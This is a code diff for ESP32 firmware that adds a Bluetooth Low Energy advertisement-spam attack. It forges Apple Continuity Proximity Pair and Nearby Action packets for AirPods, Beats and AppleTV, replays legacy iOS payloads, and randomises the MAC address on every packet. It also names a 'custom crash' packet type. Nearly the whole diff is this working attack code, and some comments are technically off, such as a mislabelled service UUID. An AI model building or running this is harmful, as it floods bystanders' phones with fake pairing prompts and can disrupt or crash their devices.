@@ -38,6 +38,11 @@ static const char *TAG_BLE = "BLE_MANAGER";
 static int airTagCount = 0;
 static bool ble_initialized = false;
 static esp_timer_handle_t flush_timer = NULL;
+static TaskHandle_t nimble_host_task_handle = NULL;
+
+// Forward declarations
+static void generate_random_mac(uint8_t *mac_addr);
+static void restart_ble_stack(void);
 
 typedef struct {
     ble_data_handler_t handler;
@@ -72,7 +77,69 @@ static TaskHandle_t spam_task_handle = NULL;
 static volatile bool spam_running = false;
 static ble_spam_type_t current_spam_type = BLE_SPAM_APPLE;
 
-// spam payload data
+// Apple Continuity Protocol Support
+typedef enum {
+    CONTINUITY_TYPE_PROXIMITY_PAIR = 0x07,
+    CONTINUITY_TYPE_NEARBY_ACTION = 0x0F,
+    CONTINUITY_TYPE_CUSTOM_CRASH = 0x0F  // Same as nearby action but with special payload
+} continuity_type_t;
+
+typedef struct {
+    uint16_t model;
+    const char* name;
+    uint8_t colors[8];  // Up to 8 color options per device
+    uint8_t color_count;
+} apple_device_t;
+
+// Apple/Beats device models with colors
+static const apple_device_t apple_devices[] = {
+    {0x0E20, "AirPods Pro", {0x00}, 1},
+    {0x0A20, "AirPods Max", {0x00, 0x02, 0x03, 0x0F, 0x11}, 5},
+    {0x0055, "AirTag", {0x00}, 1},
+    {0x0030, "Hermes AirTag", {0x00}, 1},
+    {0x0220, "AirPods", {0x00}, 1},
+    {0x0F20, "AirPods 2nd Gen", {0x00}, 1},
+    {0x1320, "AirPods 3rd Gen", {0x00}, 1},
+    {0x1420, "AirPods Pro 2nd Gen", {0x00}, 1},
+    {0x1020, "Beats Flex", {0x00, 0x01}, 2},
+    {0x0620, "Beats Solo 3", {0x00, 0x01, 0x06, 0x07, 0x08, 0x09, 0x0E, 0x0F}, 8},
+    {0x0320, "Powerbeats 3", {0x00, 0x01, 0x0B, 0x0C, 0x0D, 0x12, 0x13, 0x14}, 8},
+    {0x0B20, "Powerbeats Pro", {0x00, 0x02, 0x03, 0x04, 0x05, 0x06, 0x0B, 0x0D}, 8},
+    {0x0C20, "Beats Solo Pro", {0x00, 0x01}, 2},
+    {0x1120, "Beats Studio Buds", {0x00, 0x01, 0x02, 0x03, 0x04, 0x06}, 6},
+    {0x0520, "Beats X", {0x00, 0x01, 0x02, 0x05, 0x1D, 0x25}, 6},
+    {0x0920, "Beats Studio 3", {0x00, 0x01, 0x02, 0x03, 0x18, 0x19, 0x25, 0x26}, 8},
+    {0x1720, "Beats Studio Pro", {0x00, 0x01}, 2},
+    {0x1220, "Beats Fit Pro", {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}, 8},
+    {0x1620, "Beats Studio Buds+", {0x00, 0x01, 0x02, 0x03, 0x04}, 5}
+};
+
+// Nearby Action types
+static const struct {
+    uint8_t action;
+    const char* name;
+} nearby_actions[] = {
+    {0x13, "AppleTV AutoFill"},
+    {0x24, "Apple Vision Pro"},
+    {0x05, "Apple Watch"},
+    {0x27, "AppleTV Connecting..."},
+    {0x20, "Join This AppleTV?"},
+    {0x19, "AppleTV Audio Sync"},
+    {0x1E, "AppleTV Color Balance"},
+    {0x09, "Setup New iPhone"},
+    {0x2F, "Sign in to other device"},
+    {0x02, "Transfer Phone Number"},
+    {0x0B, "HomePod Setup"},
+    {0x01, "Setup New AppleTV"},
+    {0x06, "Pair AppleTV"},
+    {0x0D, "HomeKit AppleTV Setup"},
+    {0x2B, "AppleID for AppleTV?"}
+};
+
+#define APPLE_DEVICES_COUNT (sizeof(apple_devices) / sizeof(apple_devices[0]))
+#define NEARBY_ACTIONS_COUNT (sizeof(nearby_actions) / sizeof(nearby_actions[0]))
+
+// spam payload data (legacy)
 const uint8_t IOS1[] = {
     0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 
     0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
@@ -114,7 +181,63 @@ const WatchModel watch_models[] = {
     {0x1E}, {0x20}
 };
 
-static void spam_log_timer_cb(void *arg) {
+// Apple Continuity Protocol packet generators
+static void generate_proximity_pair_packet(uint8_t* adv_data, size_t* adv_len, uint16_t device_model, uint8_t color) {
+    *adv_len = 0;
+    
+    // Flags
+    adv_data[(*adv_len)++] = 0x02; // Length
+    adv_data[(*adv_len)++] = 0x01; // Type: Flags
+    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
+    
+    // Apple Continuity Service Data
+    adv_data[(*adv_len)++] = 0x1A; // Length (26 bytes)
+    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
+    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
+    adv_data[(*adv_len)++] = 0xFE; 
+    
+    // Continuity Header
+    adv_data[(*adv_len)++] = CONTINUITY_TYPE_PROXIMITY_PAIR; // Type: Proximity Pair
+    adv_data[(*adv_len)++] = 0x19; // Length of data
+    adv_data[(*adv_len)++] = 0x01; // Status flags
+    
+    // Device Model (little endian)
+    adv_data[(*adv_len)++] = device_model & 0xFF;
+    adv_data[(*adv_len)++] = (device_model >> 8) & 0xFF;
+    
+    // Status and Color
+    adv_data[(*adv_len)++] = 0x00; // Status
+    adv_data[(*adv_len)++] = color; // Color
+    
+    // Random data (encrypted payload simulation)
+    for (int i = 0; i < 16; i++) {
+        adv_data[(*adv_len)++] = esp_random() & 0xFF;
+    }
+}
+
+static void generate_nearby_action_packet(uint8_t* adv_data, size_t* adv_len, uint8_t action_type) {
+    *adv_len = 0;
+    
+    // Flags
+    adv_data[(*adv_len)++] = 0x02; // Length
+    adv_data[(*adv_len)++] = 0x01; // Type: Flags
+    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
+    
+    // Apple Continuity Service Data
+    adv_data[(*adv_len)++] = 0x06; // Length (6 bytes)
+    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
+    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
+    adv_data[(*adv_len)++] = 0xFE;
+    
+    // Continuity Header
+    adv_data[(*adv_len)++] = CONTINUITY_TYPE_NEARBY_ACTION; // Type: Nearby Action
+    adv_data[(*adv_len)++] = 0x05; // Length of data
+    adv_data[(*adv_len)++] = action_type; // Action type
+    adv_data[(*adv_len)++] = 0x00; // Action flags
+    adv_data[(*adv_len)++] = 0x00; // Authentication tag
+}
+
+static void spam_log_timer_cb(TimerHandle_t xTimer) {
     const char *type_name = "unknown";
     switch (current_spam_type) {
         case BLE_SPAM_APPLE: type_name = "apple"; break;
@@ -137,9 +260,32 @@ static void build_google_mfg(uint8_t *buf, size_t *len);
 
 static void spam_task(void *arg) {
     while (spam_running) {
+        // Ensure advertising is fully stopped before changing MAC
         if (ble_gap_adv_active()) {
-            ble_gap_adv_stop();
+            int rc = ble_gap_adv_stop();
+            if (rc != 0) {
+                ESP_LOGW(TAG_BLE, "Failed to stop advertising: %d", rc);
+            }
         }
+        
+        // Always wait for BLE stack to settle, even if advertising wasn't active
+        // This prevents BLE_HS_EBUSY errors when setting random MAC
+        vTaskDelay(pdMS_TO_TICKS(50));
+
+        // Generate and set random MAC address for each packet using NimBLE's random address functionality
+        uint8_t rnd_addr[6];
+        generate_random_mac(rnd_addr);
+        
+        // Use NimBLE's random address functionality for stable MAC randomization
+        int rc = ble_hs_id_set_rnd(rnd_addr);
+        if (rc != 0) {
+            ESP_LOGW(TAG_BLE, "Failed to set random address: %d", rc);
+        } else {
+            ESP_LOGD(TAG_BLE, "Set random MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
+                     rnd_addr[0], rnd_addr[1], rnd_addr[2], rnd_addr[3], rnd_addr[4], rnd_addr[5]);
+        }
+        
+        // Continue with advertisement setup
 
         struct ble_hs_adv_fields fields;
         memset(&fields, 0, sizeof(fields));
@@ -153,7 +299,95 @@ static void spam_task(void *arg) {
             generate_random_name(name, sizeof(name));
             build_microsoft_mfg(name, mfg_buf, &mfg_len);
         } else if (current_spam_type == BLE_SPAM_APPLE) {
-            build_apple_mfg(mfg_buf, &mfg_len);
+            // Randomly choose between Apple Continuity protocol and legacy iOS payloads
+            uint32_t apple_type = esp_random() % 3;
+            
+            if (apple_type == 0) {
+                // Legacy iOS payload 1
+                mfg_buf[0] = 0x4C;  // Apple Company ID (little endian)
+                mfg_buf[1] = 0x00;
+                memcpy(&mfg_buf[2], IOS1, sizeof(IOS1));
+                mfg_len = sizeof(IOS1) + 2;
+                ESP_LOGD(TAG_BLE, "Sending legacy iOS payload 1");
+            } else if (apple_type == 1) {
+                // Legacy iOS payload 2
+                mfg_buf[0] = 0x4C;  // Apple Company ID (little endian)
+                mfg_buf[1] = 0x00;
+                memcpy(&mfg_buf[2], IOS2, sizeof(IOS2));
+                mfg_len = sizeof(IOS2) + 2;
+                ESP_LOGD(TAG_BLE, "Sending legacy iOS payload 2");
+            } else {
+                // Use advanced Apple Continuity protocol
+                uint8_t adv_data[31];
+                size_t adv_len = 0;
+                
+                // Randomly choose between Proximity Pair and Nearby Action
+                if (esp_random() % 2 == 0) {
+                    // Proximity Pair - random Apple/Beats device
+                    uint32_t device_idx = esp_random() % APPLE_DEVICES_COUNT;
+                    const apple_device_t* device = &apple_devices[device_idx];
+                    uint8_t color = device->colors[esp_random() % device->color_count];
+                    
+                    generate_proximity_pair_packet(adv_data, &adv_len, device->model, color);
+                    ESP_LOGD(TAG_BLE, "Sending Proximity Pair for %s (model: 0x%04X, color: 0x%02X)", 
+                            device->name, device->model, color);
+                } else {
+                    // Nearby Action - random action type
+                    uint32_t action_idx = esp_random() % NEARBY_ACTIONS_COUNT;
+                    uint8_t action_type = nearby_actions[action_idx].action;
+                    
+                    generate_nearby_action_packet(adv_data, &adv_len, action_type);
+                    ESP_LOGD(TAG_BLE, "Sending Nearby Action: %s (0x%02X)", 
+                            nearby_actions[action_idx].name, action_type);
+                }
+                
+                // Convert Apple Continuity packet to manufacturer data format to avoid memory leaks
+                // Extract the Continuity service data and format as Apple manufacturer data
+                if (adv_len >= 9) {  // Minimum: 3 bytes flags + 6 bytes service data header
+                    // Find the service data portion (skip flags)
+                    uint8_t* service_data_start = NULL;
+                    size_t remaining = adv_len - 3;  // Skip flags
+                    uint8_t* ptr = &adv_data[3];
+                    
+                    while (remaining > 0) {
+                        uint8_t len = ptr[0];
+                        uint8_t type = ptr[1];
+                        
+                        if (type == 0x16 && len >= 4) {  // Service Data with 16-bit UUID
+                            // Check if it's Apple Continuity service (0xFED2)
+                            if (ptr[2] == 0xD2 && ptr[3] == 0xFE) {
+                                service_data_start = &ptr[4];  // Skip length, type, and UUID
+                                break;
+                            }
+                        }
+                        
+                        ptr += len + 1;
+                        remaining -= len + 1;
+                    }
+                    
+                    if (service_data_start && (service_data_start - adv_data) < adv_len) {
+                        // Format as Apple manufacturer data: Company ID (0x004C) + Continuity data
+                        mfg_buf[0] = 0x4C;  // Apple Company ID (little endian)
+                        mfg_buf[1] = 0x00;
+                        
+                        size_t continuity_data_len = adv_len - (service_data_start - adv_data);
+                        if (continuity_data_len <= sizeof(mfg_buf) - 2) {
+                            memcpy(&mfg_buf[2], service_data_start, continuity_data_len);
+                            mfg_len = continuity_data_len + 2;
+                        } else {
+                            ESP_LOGW(TAG_BLE, "Apple Continuity data too large, truncating");
+                            memcpy(&mfg_buf[2], service_data_start, sizeof(mfg_buf) - 2);
+                            mfg_len = sizeof(mfg_buf);
+                        }
+                    } else {
+                        ESP_LOGE(TAG_BLE, "Could not find Apple Continuity service data");
+                        continue;
+                    }
+                } else {
+                    ESP_LOGE(TAG_BLE, "Invalid Apple Continuity packet size: %zu", adv_len);
+                    continue;
+                }
+            }
         } else if (current_spam_type == BLE_SPAM_SAMSUNG) {
             build_samsung_mfg(mfg_buf, &mfg_len);
         } else if (current_spam_type == BLE_SPAM_GOOGLE) {
@@ -165,7 +399,66 @@ static void spam_task(void *arg) {
                 generate_random_name(name, sizeof(name));
                 build_microsoft_mfg(name, mfg_buf, &mfg_len);
             } else if (rand_type == 1) {
-                build_apple_mfg(mfg_buf, &mfg_len);
+                // Use advanced Apple Continuity protocol for random spam too
+                uint8_t adv_data[31];
+                size_t adv_len = 0;
+                
+                if (esp_random() % 2 == 0) {
+                    uint32_t device_idx = esp_random() % APPLE_DEVICES_COUNT;
+                    const apple_device_t* device = &apple_devices[device_idx];
+                    uint8_t color = device->colors[esp_random() % device->color_count];
+                    generate_proximity_pair_packet(adv_data, &adv_len, device->model, color);
+                } else {
+                    uint32_t action_idx = esp_random() % NEARBY_ACTIONS_COUNT;
+                    uint8_t action_type = nearby_actions[action_idx].action;
+                    generate_nearby_action_packet(adv_data, &adv_len, action_type);
+                }
+                
+                // Convert Apple Continuity packet to manufacturer data format to avoid memory leaks
+                if (adv_len >= 9) {  // Minimum: 3 bytes flags + 6 bytes service data header
+                    // Find the service data portion (skip flags)
+                    uint8_t* service_data_start = NULL;
+                    size_t remaining = adv_len - 3;  // Skip flags
+                    uint8_t* ptr = &adv_data[3];
+                    
+                    while (remaining > 0) {
+                        uint8_t len = ptr[0];
+                        uint8_t type = ptr[1];
+                        
+                        if (type == 0x16 && len >= 4) {  // Service Data with 16-bit UUID
+                            // Check if it's Apple Continuity service (0xFED2)
+                            if (ptr[2] == 0xD2 && ptr[3] == 0xFE) {
+                                service_data_start = &ptr[4];  // Skip length, type, and UUID
+                                break;
+                            }
+                        }
+                        
+                        ptr += len + 1;
+                        remaining -= len + 1;
+                    }
+                    
+                    if (service_data_start && (service_data_start - adv_data) < adv_len) {
+                        // Format as Apple manufacturer data: Company ID (0x004C) + Continuity data
+                        mfg_buf[0] = 0x4C;  // Apple Company ID (little endian)
+                        mfg_buf[1] = 0x00;
+                        
+                        size_t continuity_data_len = adv_len - (service_data_start - adv_data);
+                        if (continuity_data_len <= sizeof(mfg_buf) - 2) {
+                            memcpy(&mfg_buf[2], service_data_start, continuity_data_len);
+                            mfg_len = continuity_data_len + 2;
+                        } else {
+                            ESP_LOGW(TAG_BLE, "Random Apple Continuity data too large, truncating");
+                            memcpy(&mfg_buf[2], service_data_start, sizeof(mfg_buf) - 2);
+                            mfg_len = sizeof(mfg_buf);
+                        }
+                    } else {
+                        ESP_LOGE(TAG_BLE, "Could not find random Apple Continuity service data");
+                        continue;
+                    }
+                } else {
+                    ESP_LOGE(TAG_BLE, "Invalid random Apple Continuity packet size: %zu", adv_len);
+                    continue;
+                }
             } else if (rand_type == 2) {
                 build_samsung_mfg(mfg_buf, &mfg_len);
             } else {
@@ -176,22 +469,38 @@ static void spam_task(void *arg) {
         fields.mfg_data = mfg_buf;
         fields.mfg_data_len = mfg_len;
 
-        if (ble_gap_adv_set_fields(&fields) == 0) {
-            struct ble_gap_adv_params adv_params;
-            memset(&adv_params, 0, sizeof(adv_params));
-            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
-            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
-
-            uint8_t own_addr_type;
-            if (ble_hs_id_infer_auto(0, &own_addr_type) == 0) {
-                uint32_t adv_ms = (esp_random() % 151) + 100;  // 100-250 ms
-                if (ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL) == 0) {
-                    spam_adv_count++;
-                }
-            }
+        rc = ble_gap_adv_set_fields(&fields);
+        if (rc != 0) {
+            ESP_LOGE(TAG_BLE, "Failed to set advertisement fields: %d", rc);
+            continue;
         }
 
-        uint32_t sleep_ms = (esp_random() % 151) + 100; // match delay
+        struct ble_gap_adv_params adv_params;
+        memset(&adv_params, 0, sizeof(adv_params));
+        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+        adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
+
+        uint8_t own_addr_type;
+        rc = ble_hs_id_infer_auto(0, &own_addr_type);
+        if (rc != 0) {
+            ESP_LOGE(TAG_BLE, "Failed to infer address type: %d", rc);
+            continue;
+        }
+
+        // Use random address type when we set a random MAC
+        own_addr_type = BLE_OWN_ADDR_RANDOM;
+        
+        uint32_t adv_ms = (esp_random() % 151) + 200;  // 200-350 ms
+        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
+        if (rc != 0) {
+            ESP_LOGE(TAG_BLE, "Failed to start advertisement: %d", rc);
+            continue;
+        }
+        
+        spam_adv_count++;
+        ESP_LOGD(TAG_BLE, "Successfully sent spam packet #%lu", (unsigned long)spam_adv_count);
+
+        uint32_t sleep_ms = (esp_random() % 151) + 200; // match delay
         vTaskDelay(pdMS_TO_TICKS(sleep_ms));
     }
     spam_task_handle = NULL;
@@ -225,10 +534,56 @@ static void generate_random_name(char *name, size_t max_len) {
 
 static void generate_random_mac(uint8_t *mac_addr) {
     esp_fill_random(mac_addr, 6);
+    // Allow any MAC address including multicast (LSB can be 1)
+    // This requires ESP-IDF patch to remove unicast restriction
+}
 
-    mac_addr[0] |= 0xC0;
-
-    mac_addr[0] &= 0xFE;
+// Function to restart the NimBLE stack after MAC address change
+static void restart_ble_stack(void) {
+    if (!ble_initialized) {
+        return;
+    }
+    
+    // Stop any active advertising
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
+    
+    // Small delay to let stack settle
+    vTaskDelay(pdMS_TO_TICKS(10));
+    
+    // Stop and deinitialize the NimBLE stack
+    nimble_port_stop();
+    nimble_port_deinit();
+    
+    // Wait for nimble host task to finish and clean up
+    if (nimble_host_task_handle != NULL) {
+        // Wait for the task to finish (nimble_port_stop should cause it to exit)
+        vTaskDelay(pdMS_TO_TICKS(100));
+        nimble_host_task_handle = NULL;
+    }
+    
+    // Small delay before reinitializing
+    vTaskDelay(pdMS_TO_TICKS(50));
+    
+    // Reinitialize the NimBLE stack
+    int ret = nimble_port_init();
+    if (ret != 0) {
+        ESP_LOGE(TAG_BLE, "Failed to reinit nimble port: %d", ret);
+        return;
+    }
+    
+    // Restart the NimBLE host task
+    xTaskCreate(nimble_host_task, "nimble_host", 4096, NULL, 5, &nimble_host_task_handle);
+    
+    // Wait for NimBLE stack to be ready
+    vTaskDelay(pdMS_TO_TICKS(100));
+    
+    // Reconfigure BLE stack for random addresses
+    ble_hs_cfg.sm_our_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+    ble_hs_cfg.sm_their_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+    
+    ESP_LOGI(TAG_BLE, "BLE stack restarted successfully");
 }
 
 void stop_ble_stack() {
@@ -931,7 +1286,18 @@ void ble_init(void) {
         }
 
         // Configure and start the NimBLE host task
-        xTaskCreate(nimble_host_task, "nimble_host", 4096, NULL, 5, NULL);
+        xTaskCreate(nimble_host_task, "nimble_host", 4096, NULL, 5, &nimble_host_task_handle);
+        
+        // Wait for NimBLE stack to be ready
+        vTaskDelay(pdMS_TO_TICKS(100));
+        
+        // Configure BLE stack to use random addresses by default for spam functionality
+        // This is equivalent to NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM)
+        // and fixes MAC randomization issues
+        ble_hs_cfg.sm_our_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+        ble_hs_cfg.sm_their_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
+        
+        ESP_LOGI(TAG_BLE, "BLE configured for random address support");
 
         ble_initialized = true;
         ESP_LOGI(TAG_BLE, "BLE initialized");
@@ -955,6 +1321,13 @@ void ble_deinit(void) {
 
         nimble_port_stop();
         nimble_port_deinit();
+        
+        // Wait for nimble host task to finish and clean up
+        if (nimble_host_task_handle != NULL) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+            nimble_host_task_handle = NULL;
+        }
+        
         ble_initialized = false;
         ESP_LOGI(TAG_BLE, "BLE deinitialized successfully.");
         TERMINAL_VIEW_ADD_TEXT("BLE deinitialized successfully.\n");
